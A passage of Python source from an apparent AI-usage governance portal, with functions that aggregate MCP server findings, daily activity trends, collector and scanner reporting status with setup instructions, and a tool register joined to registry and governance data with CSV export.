        .claude.json mcpServers: figma,context7

    and older ones folded the list into the tool name instead

        claude-code-mcp:figma,context7

    which is why the second exists at all: every distinct combination of
    servers became a separate tool, so a machine with two servers and a machine
    with one looked like two unrelated tools rather than one server in common.
    """
    rows = {}
    for f in findings:
        if (f.get("surface") or "") != "mcp":
            continue
        tool = f.get("tool") or ""
        if not tool:
            continue

        servers, base_tool = [], tool
        ev = f.get("evidence") or ""
        if "mcpServers:" in ev:
            servers = [x.strip() for x in ev.split("mcpServers:", 1)[1].split(",")]
        elif "-mcp:" in tool:
            base_tool, listed = tool.split("-mcp:", 1)
            base_tool += "-mcp"
            servers = [x.strip() for x in listed.split(",")]
        servers = [x for x in servers if x]
        if not servers:
            # A tool on the mcp surface with no server list is still worth
            # recording: something configured MCP and the detail did not
            # survive. Dropping it would understate the estate.
            servers = ["(unnamed)"]

        device = (f.get("device") or "").strip()
        ts = f.get("reported_at") or ""
        for srv in servers:
            # Keyed case-folded: "Figma" and "figma" are one server
            # configured by two people, and listing them separately
            # inflated the server count. The first spelling seen is the
            # one shown, because that is what somebody wrote.
            key = srv.lower()
            r = rows.get(key)
            if r is None:
                r = rows[key] = {"server": srv, "tools": set(), "devices": set(),
                                 "device_names": set(), "findings": 0,
                                 "first_seen": "", "last_seen": ""}
            r["findings"] += 1
            r["tools"].add(base_tool)
            if device:
                r["devices"].add(device)
            if f.get("device_name"):
                r["device_names"].add(f["device_name"])
            if ts:
                if not r["first_seen"] or ts < r["first_seen"]:
                    r["first_seen"] = ts
                r["last_seen"] = max(r["last_seen"], ts)

    out = [dict(r, tools=sorted(r["tools"]), devices=sorted(r["devices"]),
                device_names=sorted(r["device_names"]))
           for r in rows.values()]
    # Widest reach first: a server on twenty machines is a different problem
    # from one on a single developer's laptop.
    out.sort(key=lambda r: (len(r["devices"]), r["findings"]), reverse=True)
    return out


def trends_from(findings, domain_map=None, hours=168):
    """Per-day activity across the window: the change dimension.

    Every other number here is a total over the window, which answers "how
    much" and never "which way is it going" - 23 personal accounts reads
    the same whether it was 12 last week or 40. These series are bucketed
    by UTC calendar day from the same findings, so the overview can draw
    the shape of the week instead of one number.

    Per-tool activity counts distinct devices per day; a cloud-only tool
    (no device on any finding) falls back to findings per day rather than
    flatlining at zero. tool_first_seen is kept so a tool that appeared two
    days ago can be labelled new - a thing no total can show.
    """
    domain_map = domain_map or {}
    ndays = max(2, math.ceil(hours / 24))
    today = datetime.now(timezone.utc).date()
    days = [(today - timedelta(days=i)).isoformat()
            for i in range(ndays - 1, -1, -1)]
    idx = {d: i for i, d in enumerate(days)}

    devices_daily = [set() for _ in days]
    personal_daily = [0] * ndays
    tool_devices = defaultdict(lambda: [set() for _ in days])
    tool_events = defaultdict(lambda: [0] * ndays)
    tool_first = {}

    for f in findings:
        ts = f.get("reported_at") or ""
        i = idx.get(ts[:10])
        if i is None:
            continue
        device = (f.get("device") or "").strip()
        if device:
            devices_daily[i].add(device)
        tool = f.get("tool") or ""
        if not tool or tool in NOT_A_TOOL:
            continue
        if (f.get("source") or "") in BRIDGE_SOURCES:
            continue
        tool = normalise_tool(tool, domain_map)
        tool_events[tool][i] += 1
        if device:
            tool_devices[tool][i].add(device)
        if tool not in tool_first or ts < tool_first[tool]:
            tool_first[tool] = ts
        if ((f.get("severity") or "") == "warn"
                and (f.get("account_domain") or "").strip()):
            personal_daily[i] += 1

    tools_out = {}
    for tool, events in tool_events.items():
        counts = ([len(s) for s in tool_devices[tool]]
                  if tool in tool_devices else [])
        tools_out[tool] = counts if any(counts) else events

    return {
        "days": days,
        "devices": [len(s) for s in devices_daily],
        "personal": personal_daily,
        "tools": tools_out,
        "tool_first_seen": tool_first,
    }


def tool_domains_from(reg):
    """tool id -> the domains the registry says are that tool's own, used
    to keep a tool's own sign-in domain out of its personal-account rows."""
    out = {}
    for t in (reg or {}).get("tools") or []:
        tid = t.get("id")
        if tid and t.get("domains"):
            out[tid] = [d for d in t["domains"] if d]
    return out


def device_person_map(devices):
    """Every key a device answers to - canonical and alias - pointing at
    (canonical key, person). Built after the merge, so a row keyed on
    whichever spelling its source used still resolves."""
    out = {}
    for k, d in devices.items():
        entry = (k, d.get("person") or "")
        out[k] = entry
        for alias in d.get("aliases") or ():
            out[alias] = entry
    return out


def graph_from(findings, domain_map=None, identity_map=None, hours=168,
               corp_domains=None, reg=None):
    """Everything above, assembled into the shape the API and the UI read."""
    devices, identities, tools, bridges, unattributed = build(
        findings, domain_map, identity_map)
    return {
        "devices": {
            k: dict(jsonable(v),
                    tool_accounts={t2: sorted(a2) for t2, a2
                                   in v["tool_accounts"].items()})
            for k, v in devices.items()
        },
        "identities": {k: jsonable(v) for k, v in identities.items()},
        "tools": {
            k: dict(jsonable(v),
                    usage=tool_usage(v),
                    devices_by_surface={s2: sorted(d2) for s2, d2
                                        in v["devices_by_surface"].items()})
            for k, v in tools.items()
        },
        "bridges": {k: jsonable(v) for k, v in bridges.items()},
        "unattributed": unattributed,
        "personal_accounts": personal_accounts_from(
            findings, domain_map, corp_domains, tool_domains_from(reg),
            device_person_map(devices),
            {_norm_person(k): k for k in identities}),
        "mcp_servers": mcp_from(findings),
        "trends": trends_from(findings, domain_map, hours),
        "counts": {
            "findings": len(findings),
            "devices": len(devices),
            "identities": len(identities),
            "tools": len(tools),
            "unattributed": len(unattributed),
            "no_source": sum(1 for f in findings if not f.get("source")),
            "no_device_name": sum(
                1 for f in findings
                if (f.get("device") or "").strip()
                and not (f.get("device_name") or "").strip()
            ),
        },
    }


def status_from(findings):
    """What is reporting and what is silent, derived from findings rather than
    from a config file being present.

    This is the difference between "I deployed this and see an empty screen"
    and "the Entra scanner has never reported, here is the doc". Absence is
    ambiguous on its own, so each row says which of the two it is where it
    can, and says nothing more where it cannot."""
    by_source = defaultdict(lambda: {"findings": 0, "last_seen": "", "devices": set()})
    for f in findings:
        src = f.get("source") or "(none)"
        e = by_source[src]
        e["findings"] += 1
        ts = f.get("reported_at") or ""
        e["last_seen"] = max(e["last_seen"], ts)
        dev = (f.get("device") or "").strip()
        if dev:
            e["devices"].add(dev)

    # The authoritative list. Scanner values are DetectionSource in
    # scanner/ai_guard/scanners/base.py; collectors and the extension set
    # theirs directly. Guessing at these produces a setup page that reports
    # "not reporting" for something that is reporting, which is the exact
    # false signal this view exists to remove.
    # The authoritative list. Scanner values are DetectionSource in
    # scanner/ai_guard/scanners/base.py; collectors and the extension set
    # theirs directly. Guessing at these produces a setup page that reports
    # "not reporting" for something that is reporting, which is the exact
    # false signal this view exists to remove.
    #
    # Each carries what it needs to start reporting, because a status page
    # that says "not reporting" and nothing else leaves the reader exactly
    # where they were.
    expected = [
        ("endpoint", "collector-macos", "macOS collector", "endpoint/macos/README.md",
         "Download the pre-configured script below and run it as a Jamf "
         "policy (root, recurring check-in) - the receiver URL and an "
         "enrollment token are already inside it. In classic mode, pass "
         "AIGUARD_RECEIVER_BASE, AIGUARD_TOKEN and AIGUARD_CORP_DOMAINS as "
         "script parameters instead."),
        ("endpoint", "collector-linux", "Linux collector", "endpoint/linux/README.md",
         "Download the script below and run it as root on a schedule - an "
         "RMM job, cron, or a systemd timer. It's ready to run as-is. In "
         "classic mode, set the same three environment variables as macOS."),
        ("endpoint", "collector-windows", "Windows collector", "endpoint/windows/README.md",
         "Download the script below and upload it as an Intune platform "
         "script - it's ready as-is. In classic mode, set the same three "
         "values at the top of the script first."),
        ("browser", "browser_extension", "Browser extension: accounts",
         "extension/README.md",
         "Shows which account is signed into each AI site in the browser. "
         "Pack the extension once (extension/README.md), then download the "
         "pre-configured policy for your platform below: Chromium policy "
         "for macOS, deploy scripts for Windows, and Firefox versions of "
         "both. Everything is baked in - URL, enrollment token, your "
         "domains, paste guard settings."),
        ("browser", "paste_guard", "Browser extension: paste guard",
         "extension/README.md",
         "Part of the same extension - no second install. It warns or "
         "blocks when marked documents are pasted into AI tools; set the "
         "mode and markings under Settings. If the accounts row above is "
         "reporting but this one is quiet, the guard is working and nobody "
         "has pasted anything risky."),
        ("cloud", "entra_sign_in", "Entra sign-ins", "scanner/README.md",
         "Register an app in Entra with AuditLog.Read.All and "
         "Directory.Read.All, then give the scanner AIGUARD_ENTRA_TENANT_ID, "
         "_CLIENT_ID and _CLIENT_SECRET."),
        ("cloud", "entra_delegated_access", "Entra delegated access", "scanner/README.md",
         "Same Entra app as sign-ins. Catches background/API use that "
         "interactive sign-in logs miss."),
        ("cloud", "entra_consent_grant", "Entra consent grants", "scanner/README.md",
         "Same app registration. Reports OAuth grants users have given to "
         "third-party applications."),
        ("cloud", "entra_service_principal", "Entra service principals", "scanner/README.md",
         "Same Entra app. Reports non-human identities - service accounts "
         "and app registrations, which is where hidden AI agents tend to "
         "live."),
        ("cloud", "exchange_email", "Exchange signup evidence", "scanner/README.md",
         "Add Mail.Read to the Entra app. Finds AI accounts people created "
         "with their work email directly (outside SSO) - blocking sign-in "
         "in Entra doesn't close that path."),
        ("fleet", "jamf_app", "Jamf applications", "scanner/README.md",
         "A Jamf Pro API client with read access to computer inventory. Set "
         "AIGUARD_JAMF_URL, _CLIENT_ID and _CLIENT_SECRET. On Kandji, "
         "Addigy or another MDM: anything that emits the finding shape "
         "fills this row - see docs/writing-a-scanner.md."),
        ("fleet", "jamf_extension", "Jamf browser extensions", "scanner/README.md",
         "Same Jamf credentials. Reports AI browser extensions from inventory."),
        ("fleet", "intune_app", "Intune applications", "scanner/README.md",
         "Add DeviceManagementApps.Read.All and "
         "DeviceManagementManagedDevices.Read.All to the Entra app. Without "
         "the second, findings degrade to counts with no device."),
        ("fleet", "intune_extension", "Intune browser extensions", "scanner/README.md",
         "Same Intune permissions. Not yet emitted by any scanner."),
        ("network", "sentinelone_dns", "SentinelOne DNS", "scanner/README.md",
         "A SentinelOne API token with Deep Visibility read access. Set "
         "AIGUARD_S1_URL and AIGUARD_S1_TOKEN. Using a different DNS or "
         "network-security product? Anything that emits the finding shape "
         "fills this row - see docs/writing-a-scanner.md."),
        ("network", "sentinelone_network", "SentinelOne network", "scanner/README.md",
         "Same SentinelOne token. Catches AI traffic from local processes "
         "that never touch a browser."),
        ("network", "sentinelone_bridge", "SentinelOne bridge targets", "scanner/README.md",
         "Same SentinelOne token. Shows where AI tools connected to - "
         "destinations, not installed software."),
        ("mcp", "mcp_scan", "MCP integration scan", "scanner/README.md",
         "Comes from the endpoint collectors reading AI tool config files - "
         "no separate setup. If a collector is reporting and this is quiet, "
         "nobody has configured an MCP server yet."),
    ]
    # Sources the portal can generate a pre-configured deployment artifact
    # for, when managed mode is on. The value is the API path segment
    # (/api/artifacts/<kind>). The paste guard row deliberately has none:
    # it is the same extension as the accounts row, and two buttons that
    # mint two tokens for one deployment would be a trap.
    artifact_sources = {
        "collector-macos": "collector-macos",
        "collector-linux": "collector-linux",
        "collector-windows": "collector-windows",
        "browser_extension": "extension-policy",
    }

    rows = []
    for group, src, label, doc, needs in expected:
        e = by_source.get(src)
        rows.append({
            "group": group,
            "source": src,
            "label": label,
            "doc": doc,
            "needs": needs,
            "artifact": artifact_sources.get(src, ""),
            "reporting": bool(e),
            "findings": e["findings"] if e else 0,
            "devices": len(e["devices"]) if e else 0,
            "last_seen": e["last_seen"] if e else "",
        })

    # Grouped, because seventeen flat rows is a wall rather than a status.
    # "endpoint: 3 of 3, cloud: 1 of 5" is readable at a glance; the detail is
    # still there for anyone chasing a specific source.
    groups = []
    for g in ["endpoint", "browser", "cloud", "fleet", "network", "mcp"]:
        members = [r for r in rows if r["group"] == g]
        if members:
            groups.append({
                "group": g,
                "reporting": sum(1 for r in members if r["reporting"]),
                "total": len(members),
                "sources": members,
            })

    unexpected = sorted(k for k in by_source
                        if k not in {src for _, src, _, _, _ in expected}
                        and k != "(none)")
    return {
        "sources": rows,
        "groups": groups,
        "unexpected": unexpected,
        "reporting": sum(1 for r in rows if r["reporting"]),
        "total": len(rows),
    }

def load_registry(path):
    """The whole registry, not just the domain map.

    load_domain_map reduces the file to domain -> id, which is all tool
    normalisation needs. The register needs the rest of it: vendor, category,
    risk tier, and above all the full list of tools, because a tool the
    registry knows about and nothing has ever reported is a register row in its
    own right.

    Returns {} rather than raising. A register built from observations alone is
    a worse register, not a broken portal.
    """
    if not path or not os.path.exists(path):
        return {}
    try:
        with open(path) as fh:
            if path.endswith(".json"):
                return json.load(fh) or {}
            import yaml
            return yaml.safe_load(fh) or {}
    except Exception as e:
        print("could not read registry (%s): the register will be built from "
              "observations only" % e, file=sys.stderr)
        return {}


def _base_tool(tool):
    """The tool itself, with any MCP suffix removed.

    MCP findings name the tool as <tool>-mcp, and collectors older than the
    current ones folded the server list in as <tool>-mcp:<servers>. Both are
    correct for the MCP view, where a row is a server and the suffix says which
    tool configured it.

    They are wrong for a tool inventory. claude-code-mcp is not a different
    tool from claude-code, it is evidence claude-code is on that machine. Left
    alone it becomes a permanent "not in registry" row that can never be
    resolved, because nobody would add claude-code-mcp to a registry of tools.
    """
    base = tool.split("-mcp:", 1)[0] if "-mcp:" in tool else tool
    base = base.removesuffix("-mcp")
    return base or tool


def register_from(findings, reg=None, domain_map=None, gov=None,
                  exceptions=None):
    """One row per tool: what the registry knows, joined to what was observed.

    Returns the full join, observed and not. Callers decide what to show: the
    register itself is the observed set, and the rest is the count of what is
    being watched for.

    That distinction matters and it took a wrong turn to find. A register is a
    record of what an organisation actually uses. Listing every entry in a
    shipped registry makes it a worse record, not a more complete one: it puts
    tools nobody there has heard of in front of a management review as though
    the organisation has a position on them. The registry is a watchlist, and a
    watchlist is context rather than inventory.

    The project's rule that silence is not evidence of safety applies to
    sources, not to this. A collector that stops reporting looks identical to a
    clean machine, so silent sources must be listed. A registry entry is not a
    source: a tool absent from findings is the registry correctly not matching
    something that is not there, and coverage gaps are answered by Setup and
    Uncovered devices.

    A tool observed and NOT in the registry is the row that matters most.
    Something is in use that governance has never considered, and it is flagged
    rather than quietly folded in.

    Governance fields (owner, review date, risk decision) are not derivable and
    are absent here. The page shows them as not set rather than hiding them,
    because a register that looks complete while missing the decisions is worse
    than one with visible gaps. When those decisions exist, an unobserved tool
    carrying one becomes a register row again: at that point it is a record of
    something the organisation decided, rather than a default nobody chose.
    """
    domain_map = domain_map or {}
    reg = reg or {}

    observed = defaultdict(lambda: {
        "devices": set(), "users": set(), "surfaces": set(), "sources": set(),
        "corporate_accounts": set(), "personal_accounts": set(),
        "findings": 0, "first_seen": "", "last_seen": "",
    })

    for f in findings:
        tool = f.get("tool") or ""
        if not tool or tool in NOT_A_TOOL:
            continue
        if (f.get("source") or "") in BRIDGE_SOURCES:
            continue
        tool = normalise_tool(_base_tool(tool), domain_map)

        o = observed[tool]
        o["findings"] += 1
        for key, val in (("devices", (f.get("device") or "").strip()),
                         ("users", (f.get("user") or "").strip()),
                         ("surfaces", f.get("surface") or ""),
                         ("sources", f.get("source") or "")):
            if val:
                o[key].add(val)

        acct = (f.get("account_domain") or "").strip().lower()
        if acct:
            # Same rule personal_accounts_from uses: the reporter decided, at
            # the point of detection, with the corporate domain list it was
            # given. The portal does not re-derive it, because it may not hold
            # the same list and two definitions that disagree is worse than one
            # that is occasionally coarse.
            if (f.get("severity") or "") == "warn":
                o["personal_accounts"].add(acct)
            else:
                o["corporate_accounts"].add(acct)

        ts = f.get("reported_at") or ""
        if ts:
            if not o["first_seen"] or ts < o["first_seen"]:
                o["first_seen"] = ts
            o["last_seen"] = max(o["last_seen"], ts)

    known = {}
    for t in reg.get("tools", []) or []:
        tid = t.get("id")
        if tid:
            known[tid] = t

    rows = []
    for tid in sorted(set(known) | set(observed)):
        meta = known.get(tid, {})
        o = observed.get(tid)
        # The organisation's decision if one is recorded, otherwise the
        # registry's own flag as a labelled default. governance.decide keeps
        # the two distinguishable, because every tool ships not approved and a
        # register that presented that as a position would be asserting a
        # refusal nobody made.
        g = governance.decide(tid, gov, meta.get("approved"),
                              exceptions=exceptions)
        rows.append({
            "id": tid,
            "name": meta.get("name") or tid,
            "vendor": meta.get("vendor") or "",
            "category": meta.get("category") or "",
            "risk_tier": meta.get("risk_tier") or "",
            # The registry's own boolean, reported as it stands. The portal
            # does not decide approval and must not imply it has.
            "approved": meta.get("approved"),
            "status": g["status"],
            "stored_status": g["stored_status"],
            "status_reason": g["reason"],
            "status_source": g["source"],
            "owner": g["owner"],
            "review_due": g["review_due"],
            "days_overdue": g["days_overdue"],
            "exceptions": g["exceptions"],
            "expired_exceptions": g["expired_exceptions"],
            "in_registry": tid in known,
            "observed": o is not None,
            "devices": len(o["devices"]) if o else 0,
            "users": len(o["users"]) if o else 0,
            "surfaces": sorted(o["surfaces"]) if o else [],
            "sources": sorted(o["sources"]) if o else [],
            "corporate_accounts": len(o["corporate_accounts"]) if o else 0,
            "personal_accounts": len(o["personal_accounts"]) if o else 0,
            "findings": o["findings"] if o else 0,
            "first_seen": o["first_seen"] if o else "",
            "last_seen": o["last_seen"] if o else "",
        })

    # Observed first, then by exposure. An unobserved tool is a real row but it
    # is not what someone opening this page needs to look at first.
    rows.sort(key=lambda r: (not r["observed"], -r["devices"],
                             -r["personal_accounts"], r["name"].lower()))
    return rows


REGISTER_COLUMNS = [
    "id", "name", "vendor", "category", "risk_tier",
    "status", "stored_status", "status_reason", "status_source",
    "owner", "review_due", "days_overdue", "approved",
    "in_registry", "observed", "devices", "users", "corporate_accounts",
    "personal_accounts", "findings", "surfaces", "sources",
    "first_seen", "last_seen",
]


def register_csv(rows):
    """CSV of the register, for spreadsheets and ad-hoc review.

    Deliberately not an evidence artifact: no manifest, no checksum, no
    reproducibility guarantee. The provenance that matters, when it was taken
    and over what window, is carried in the filename by the endpoint, because a
    filename survives being emailed around and a header comment does not.
    """
    out = io.StringIO()
    w = csv.writer(out)
    w.writerow(REGISTER_COLUMNS)
    for r in rows:
        w.writerow([
            csv_safe(";".join(r[c])) if isinstance(r.get(c), list)
            else ("" if r.get(c) is None else csv_safe(r.get(c)))
            for c in REGISTER_COLUMNS
        ])
    return out.getvalue()